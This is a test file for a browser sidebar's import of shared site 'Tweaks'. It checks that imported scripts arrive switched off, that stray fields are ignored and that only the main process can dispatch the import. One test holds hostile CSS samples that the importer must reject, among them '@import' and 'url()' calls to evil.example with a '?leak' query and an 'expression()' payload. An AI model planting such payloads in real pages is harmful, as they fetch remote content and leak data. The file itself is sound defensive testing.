// How a Tweak that came from a file or a link gets into the state, and what keeps its script from running without its owner.

import { describe, expect, it } from 'vitest'
import { boostRunsScript, combineBoosts, composeBoostCss, scriptSwitchedOff } from './boost'
import type { SharedBoost } from './boost-share'
import { interfaceMayDispatch, MAIN_ONLY_ACTIONS } from './ipc-policy'
import { BOOST_JS_MAX, NEUTRAL_TINT, type Boost, type SidebarState } from './model'
import { privateAction } from './private-window'
import { createInitialState, normalize, reduce, type Action, type Ctx } from './sidebar'

let counter = 0
const ctx = (): Ctx => ({ now: 1, newId: () => `generated-${++counter}` })
const start = (settings: Partial<SidebarState['settings']> = {}): SidebarState => {
  const initial = createInitialState(ctx())
  return { ...initial, settings: { ...initial.settings, ...settings } }
}
const run = (state: SidebarState, ...actions: Action[]): SidebarState => actions.reduce((s, a) => reduce(s, a, ctx()), state)

const shared = (over: Partial<SharedBoost> = {}): SharedBoost => ({ name: 'Sombre', host: 'example.com', css: 'body { background: #111 }', js: '', zoom: 1.2, zap: ['#ad'], tint: { hue: 10, saturation: 1, brightness: 1, contrast: 1 }, fontFamily: 'inter', textCase: 'upper', invert: true, ...over })
const install = (state: SidebarState, boost: SharedBoost, id = 'imported-1'): SidebarState => run(state, { type: 'boost/import', id, boost })
const asBoost = (over: Partial<Boost> = {}): Boost => ({ id: 'b', name: 'b', host: 'example.com', enabled: true, css: '', js: '', zoom: 1, zap: [], tint: NEUTRAL_TINT, ...over })

describe('boost/import', () => {
  it('installs the Tweak under the id it is given, switched on, with everything the file held', () => {
    const state = install(start(), shared())
    expect(state.boosts).toEqual([
      { id: 'imported-1', name: 'Sombre', host: 'example.com', enabled: true, css: 'body { background: #111 }', js: '', zoom: 1.2, zap: ['#ad'], tint: { hue: 10, saturation: 1, brightness: 1, contrast: 1 }, fontFamily: 'inter', textCase: 'upper', invert: true }
    ])
  })

  it('takes nothing when sharing is switched off', () => {
    const off = start({ boostSharing: false })
    expect(install(off, shared())).toBe(off)
    expect(install(start({ boostSharing: true }), shared()).boosts).toHaveLength(1)
  })

  it('stores a script switched off, and keeps its text for the person to read', () => {
    const state = install(start(), shared({ js: 'document.title = "x"' }))
    expect(state.boosts[0]).toMatchObject({ js: 'document.title = "x"', jsEnabled: false, enabled: true })
  })

  it('has no switched-off script to store when there is no script', () => {
    expect(install(start(), shared({ js: '' })).boosts[0]).not.toHaveProperty('jsEnabled')
    expect(install(start(), shared({ js: '  \n ' })).boosts[0]).not.toHaveProperty('jsEnabled')
  })

  it('drops the script when the setting says never, whatever the file or the dialog said', () => {
    const state = install(start({ boostScriptImport: 'never' }), shared({ js: 'document.title = "x"' }))
    expect(state.boosts[0]).toMatchObject({ js: '' })
    expect(state.boosts[0]).not.toHaveProperty('jsEnabled')
    // The CSS and the rest still arrive.
    expect(state.boosts[0]).toMatchObject({ css: 'body { background: #111 }', zoom: 1.2 })
  })

  it('keeps the script, switched off, when the setting says ask', () => {
    expect(install(start({ boostScriptImport: 'ask' }), shared({ js: 'a()' })).boosts[0]).toMatchObject({ js: 'a()', jsEnabled: false })
  })

  it('reads the Tweak again with the rules of the file reader, and installs nothing that fails them', () => {
    const base = start()
    const hostile: Array<Partial<SharedBoost>> = [
      { css: '@import url(https://evil.example/x.css);' },
      { css: 'a { background: url(https://evil.example/?leak) }' },
      { css: 'a { background: image-set("https://evil.example/a.png" 1x) }' },
      { css: 'a { width: expression(alert(1)) }' },
      { host: 'com' },
      { host: 'https://example.com/path' },
      { host: 'abcdefghijklmnopabcdefghijklmnop' },
      { zap: ['a { background: url(x) } b'] },
      { zoom: 99 },
      { fontFamily: 'nope' },
      { js: `x${String.fromCharCode(0x202e)}` },
      { name: `x${String.fromCharCode(0x200b)}` }
    ]
    for (const over of hostile) expect(install(base, shared(over)), JSON.stringify(over)).toBe(base)
    expect(run(base, { type: 'boost/import', id: 'x', boost: null as unknown as SharedBoost })).toBe(base)
    expect(run(base, { type: 'boost/import', id: 'x', boost: 'boost' as unknown as SharedBoost })).toBe(base)
  })

  it('does not carry a field the action holds beyond the Tweak’s own', () => {
    const state = run(start(), { type: 'boost/import', id: 'imported-1', boost: { ...shared(), enabled: false, jsEnabled: true, id: 'steal', settings: { boostsEnabled: false } } as unknown as SharedBoost })
    expect(state.boosts[0]).toMatchObject({ id: 'imported-1', enabled: true })
    expect(state.boosts[0]).not.toHaveProperty('settings')
    expect(state.settings.boostsEnabled).toBe(true)
  })

  it('does not let an imported script come in switched on by saying so', () => {
    const state = run(start(), { type: 'boost/import', id: 'imported-1', boost: { ...shared({ js: 'a()' }), jsEnabled: true } as unknown as SharedBoost })
    expect(state.boosts[0]).toMatchObject({ jsEnabled: false })
  })

  it('takes a new id when the one given is taken or not usable, and never replaces a Tweak', () => {
    const first = install(start(), shared({ name: 'Premier' }), 'same')
    const second = install(first, shared({ name: 'Second' }), 'same')
    expect(second.boosts.map((b) => b.name)).toEqual(['Premier', 'Second'])
    expect(new Set(second.boosts.map((b) => b.id)).size).toBe(2)
    expect(second.boosts[0]).toBe(first.boosts[0])
    for (const id of ['', 'bad id', '../x', 'a'.repeat(65), 5 as unknown as string]) {
      const state = install(start(), shared(), id)
      expect(state.boosts[0]!.id, String(id)).toMatch(/^generated-\d+$/)
    }
  })

  it('installs nothing rather than give two Tweaks one id, even when the generator of ids repeats itself', () => {
    const stuck: Ctx = { now: 1, newId: () => 'stuck' }
    const first = reduce(start(), { type: 'boost/import', id: 'stuck', boost: shared({ name: 'Premier' }) }, stuck)
    const second = reduce(first, { type: 'boost/import', id: 'not a valid id', boost: shared({ name: 'Second' }) }, stuck)
    expect(first.boosts.map((b) => b.id)).toEqual(['stuck'])
    expect(second).toBe(first)
  })

  it('adds a number to a name the site already has, and only to that', () => {
    let state = install(start(), shared({ name: 'Sombre' }), 'a')
    state = install(state, shared({ name: 'sombre' }), 'b')
    state = install(state, shared({ name: 'Sombre' }), 'c')
    state = install(state, shared({ name: 'Sombre', host: 'other.example' }), 'd')
    expect(state.boosts.map((b) => b.name)).toEqual(['Sombre', 'sombre (2)', 'Sombre (3)', 'Sombre'])
    const long = 'x'.repeat(60)
    state = install(install(state, shared({ name: long }), 'e'), shared({ name: long }), 'f')
    expect(state.boosts.at(-1)!.name).toBe(`${'x'.repeat(56)} (2)`)
    expect(state.boosts.at(-1)!.name.length).toBeLessThanOrEqual(60)
  })

  it('leaves the Tweaks that were there, and the rest of the state, as they were', () => {
    const before = run(start(), { type: 'boost/save', boost: { id: 'mine', host: 'example.com', name: 'Mien', js: 'mine()' } })
    const after = install(before, shared({ js: 'theirs()' }))
    expect(after.boosts[0]).toBe(before.boosts[0])
    expect(after.boosts[0]).toMatchObject({ js: 'mine()' })
    expect(after.boosts[0]).not.toHaveProperty('jsEnabled')
    expect({ ...after, boosts: [] }).toEqual({ ...before, boosts: [] })
  })

  it('is for the main process: the interface cannot dispatch it, and a private window does not accept it', () => {
    expect(MAIN_ONLY_ACTIONS.has('boost/import')).toBe(true)
    expect(interfaceMayDispatch({ type: 'boost/import', id: 'x', boost: shared() }, [])).toBe(false)
    expect(privateAction({ type: 'boost/import', id: 'x', boost: shared() })).toBeNull()
    expect(privateAction({ type: 'boost/save', boost: { host: 'example.com' } })).toBeNull()
  })

  it('gives a state that normalizes to itself', () => {
    const state = install(install(start(), shared({ js: 'a()' }), 'a'), shared({ name: 'Autre' }), 'b')
    expect(normalize(state).boosts).toEqual(state.boosts)
  })
})

describe('a script that waits', () => {
  const waiting = (): SidebarState => install(start(), shared({ js: 'document.title = "x"' }), 'w')
  const saveAs = (state: SidebarState, boost: Record<string, unknown>) => run(state, { type: 'boost/save', boost: { id: 'w', host: 'example.com', ...boost } })

  it('does not run, and is not counted as a script', () => {
    const boost = waiting().boosts[0]!
    expect(boostRunsScript(boost)).toBe(false)
    expect(combineBoosts([boost]).scripts).toEqual([])
    // Its stylesheet still applies.
    expect(combineBoosts([boost]).css).toContain('background: #111')
  })

  it('runs once its owner turns it on', () => {
    const state = saveAs(waiting(), { css: 'body { background: #111 }', js: 'document.title = "x"', jsEnabled: true })
    expect(state.boosts[0]).not.toHaveProperty('jsEnabled')
    expect(boostRunsScript(state.boosts[0]!)).toBe(true)
    expect(combineBoosts(state.boosts).scripts).toEqual(['document.title = "x"'])
  })

  it('can be turned off again', () => {
    const on = saveAs(waiting(), { js: 'a()', jsEnabled: true })
    const off = saveAs(on, { js: 'a()', jsEnabled: false })
    expect(off.boosts[0]).toMatchObject({ jsEnabled: false })
    expect(combineBoosts(off.boosts).scripts).toEqual([])
  })

  it('stays off through a save that does not speak of it: a stale editor, a toggle built from an older copy', () => {
    const state = saveAs(waiting(), { name: 'Renommé', js: 'document.title = "x"', css: 'a{}' })
    expect(state.boosts[0]).toMatchObject({ name: 'Renommé', jsEnabled: false })
    const { jsEnabled: _gone, ...copy } = waiting().boosts[0]!
    expect(run(waiting(), { type: 'boost/save', boost: { ...copy, enabled: false } }).boosts[0]).toMatchObject({ enabled: false, jsEnabled: false })
  })

  it('stays off through a save that sends nonsense for it', () => {
    for (const nonsense of ['true', 1, null, 'yes', {}, []]) {
      expect(saveAs(waiting(), { js: 'a()', jsEnabled: nonsense }).boosts[0], String(nonsense)).toMatchObject({ jsEnabled: false })
    }
  })

  it('stays off while its text is edited, and the edit is kept', () => {
    const state = saveAs(waiting(), { js: 'document.title = "autre"' })
    expect(state.boosts[0]).toMatchObject({ js: 'document.title = "autre"', jsEnabled: false })
  })

  it('is the default for a Tweak the person writes: a new Tweak, or one saved before the field existed', () => {
    const fresh = run(start(), { type: 'boost/save', boost: { id: 'mine', host: 'example.com', js: 'mine()' } })
    expect(boostRunsScript(fresh.boosts[0]!)).toBe(true)
    const old = normalize({ ...start(), boosts: [{ id: 'old', host: 'example.com', enabled: true, css: '', js: 'old()' }] } as unknown as SidebarState)
    expect(boostRunsScript(old.boosts[0]!)).toBe(true)
  })

  it('is read from a state file as exactly `false`, and from nothing else', () => {
    const file = (jsEnabled: unknown): SidebarState => normalize({ ...start(), boosts: [{ id: 'x', host: 'example.com', enabled: true, css: '', js: 'a()', jsEnabled }] } as unknown as SidebarState)
    expect(file(false).boosts[0]).toMatchObject({ jsEnabled: false })
    for (const other of [true, 'false', 0, null, 'no', {}, []]) expect(file(other).boosts[0], JSON.stringify(other)).not.toHaveProperty('jsEnabled')
  })

  it('asks for the page to be reloaded when a running script is switched off, and only then', () => {
    const running = asBoost({ js: 'a()' })
    expect(scriptSwitchedOff(running, { ...running, jsEnabled: false })).toBe(true)
    // A script that waits runs nowhere: editing it, or saving it again switched off, reloads nothing.
    expect(scriptSwitchedOff({ ...running, jsEnabled: false }, { ...running, js: 'b()', jsEnabled: false })).toBe(false)
    // Switched on, edited while running, or left as it is: the pages that run it are reloaded by their scripts, not by this rule.
    expect(scriptSwitchedOff({ ...running, jsEnabled: false }, running)).toBe(false)
    expect(scriptSwitchedOff(running, { ...running, js: 'b()' })).toBe(false)
    expect(scriptSwitchedOff(running, running)).toBe(false)
    expect(scriptSwitchedOff(undefined, { ...running, jsEnabled: false })).toBe(false)
    expect(scriptSwitchedOff(running, undefined)).toBe(false)
    expect(scriptSwitchedOff(asBoost({ js: '' }), asBoost({ js: '', jsEnabled: false }))).toBe(false)
  })

  it('counts for nothing in a Tweak with no script at all', () => {
    expect(boostRunsScript(asBoost({ js: '', jsEnabled: true }))).toBe(false)
    expect(boostRunsScript(asBoost({ js: ' \n', jsEnabled: undefined }))).toBe(false)
    expect(boostRunsScript(asBoost({ js: 'a()' }))).toBe(true)
  })

  it('does not change the stylesheet a Tweak injects', () => {
    const boost = asBoost({ css: 'a { color: red }', js: 'a()', jsEnabled: false })
    const { jsEnabled: _off, ...bare } = boost
    expect(composeBoostCss(boost)).toBe(composeBoostCss(bare))
  })
})

describe('what a Tweak may be for and carry', () => {
  const save = (state: SidebarState, boost: Parameters<typeof asBoost>[0] & { host: string }) => run(state, { type: 'boost/save', boost })

  it('refuses a bare top-level name as the host: it would style every site under it', () => {
    for (const host of ['com', 'org', '.com', 'com.', 'a..b', 'exa mple.com', '', '  ']) expect(save(start(), { host }).boosts, JSON.stringify(host)).toEqual([])
    for (const host of ['example.com', 'WWW.Example.COM', 'localhost', '127.0.0.1', '[::1]', 'intranet.corp']) expect(save(start(), { host }).boosts, host).toHaveLength(1)
    expect(save(start(), { host: 'WWW.Example.COM' }).boosts[0]?.host).toBe('example.com')
  })

  it('drops a Tweak of a file whose host is a bare name, like a save does', () => {
    const state = normalize({ ...start(), boosts: [asBoost({ id: 'ok', host: 'example.com' }), asBoost({ id: 'wide', host: 'com' })] })
    expect(state.boosts.map((b) => b.id)).toEqual(['ok'])
  })

  it('refuses a save whose script passes the bound, and leaves the Tweak as it was', () => {
    const before = save(start(), { host: 'example.com', id: 'b1', js: 'console.log(1)' })
    const after = save(before, { host: 'example.com', id: 'b1', js: 'x'.repeat(BOOST_JS_MAX + 1) })
    expect(after.boosts).toEqual(before.boosts)
    expect(save(before, { host: 'example.com', id: 'b1', js: 'x'.repeat(BOOST_JS_MAX) }).boosts[0]?.js).toHaveLength(BOOST_JS_MAX)
  })

  it('empties a script past the bound when a file is read, instead of carrying a state that weighs on every snapshot', () => {
    const state = normalize({ ...start(), boosts: [asBoost({ id: 'big', js: 'x'.repeat(BOOST_JS_MAX + 1), jsEnabled: true })] })
    expect(state.boosts[0]?.js).toBe('')
  })
})
